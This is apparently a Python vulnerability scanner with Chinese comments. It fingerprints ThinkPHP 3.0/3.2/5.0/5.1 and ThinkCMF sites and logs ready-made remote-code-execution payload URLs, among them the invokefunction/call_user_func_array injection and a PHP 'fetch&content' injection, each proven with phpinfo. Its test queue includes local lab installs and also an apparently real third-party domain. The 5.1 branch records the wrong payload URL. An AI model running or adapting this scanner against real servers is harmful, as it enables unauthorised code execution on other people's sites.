import requests
import threading
import urllib3
import base64
from termcolor import cprint
from urllib.parse import urlparse
from queue import Queue

class Detect(threading.Thread):
    def __init__(self, alive_Web_queue, vul_list):
        threading.Thread.__init__(self)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.alive_Web_queue = alive_Web_queue
        self.vul_list = vul_list

    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.run_detect(alive_web)

    def run_detect(self, url):
        if not urlparse(url).scheme:
            url = 'https://' + url
        else:
            url = url
        try:
            #thinkphp3.0 ThinkPHP 2.1 { Fast & Simple OOP PHP Framework } rce 暂时还没找到能确定tp5.1的指纹，这里先用报错的
            rep = requests.get(url + "/index.php/herxdjhrelzfndk.html",timeout=10,verify=False)
            if "ThinkPHP" in rep.text and "2.1" in rep.text and "{ Fast & Simple OOP PHP Framework }" in rep.text:
                #if "phpinfo()" in requests.get(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D").text:
                cprint('[thinkphp 3.0 rce ] {}'.format(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"), 'red')
                self.vul_list.append(['thinkphp 3.0', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D" ])
#            else:
#                cprint('[thinkphp 3.0] {}'.format(url), 'red')
#                self.vul_list.append(['thinkphp 3.0', url])
            if "ThinkPHP" in rep.text and "5.1" in rep.text and "www.thinkphp.cn" in rep.text:
                #if "phpinfo()" in requests.get(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1").text:
                cprint('[thinkphp 5.1 rce ] {}'.format(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1"),'red')
                self.vul_list.append(['thinkphp 5.1', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"])
#            else:
#                cprint('[thinkphp 5.1] {}'.format(url), 'red')
#                self.vul_list.append(['thinkphp 5.1', url])
            # thinkphp3.2 使用4e5e5d7364f443e28fbf0d3ae744a59a检测 rce
            rep = requests.get(url + "/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a",timeout=10,verify=False)

            if rep.status_code == 200 and "PNG" in rep.text:
                #if "phpinfo()" in requests.get(url + "/?a=fetch&content=<?php%20phpinfo();die();").text:
                cprint('[thinkcmf 3.2 rce ] {}'.format(url + "/?a=fetch&content=<?php%20phpinfo();die();"), 'red')
                self.vul_list.append(['thinkcmf 3.2', url + "/?a=fetch&content=<?php%20phpinfo();die();"])
 #           else:
 #               cprint('[thinkphp 3.2] {}'.format(url), 'red')
 #               self.vul_list.append(['thinkphp 3.2', url])
            # thinkphp5.0 使用index.php?s=captcha检测
            rep = requests.get(url + "/index.php?s=captcha",timeout=10,verify=False)
            if rep.status_code == 200 and "PNG" in rep.text:
                #if "phpinfo()" in requests.get(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1").text:
                cprint('[thinkphp 5.0 rce ] {}'.format(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"), 'red')
                self.vul_list.append(['thinkphp 5.0', url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" ])
#            else:
#               cprint('[thinkphp 5.0] {}'.format(url), 'red')
#               self.vul_list.append(['thinkphp 5.0', url])

        except Exception as e:
            pass


if __name__ == '__main__':
        vul_list = []
        alive_Web_queue = Queue()
        alive_Web_queue.put("http://localhost/ThinkPHP5.1.0/public/")
        alive_Web_queue.put("http://localhost/thinkphp_5.0.14/public/")
        alive_Web_queue.put("http://localhost/thinkphp3.2.3/")
        alive_Web_queue.put("http://emeigroup.com/")
        detect = Detect
        try:
            threads = []
            thread_num = 1
            for num in range(1, thread_num + 1):
                t = detect(alive_Web_queue, vul_list)
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
        except Exception as e:
            print(r'[-] Load Vul [{}] Error: {}'.format(detect.name, e.args))
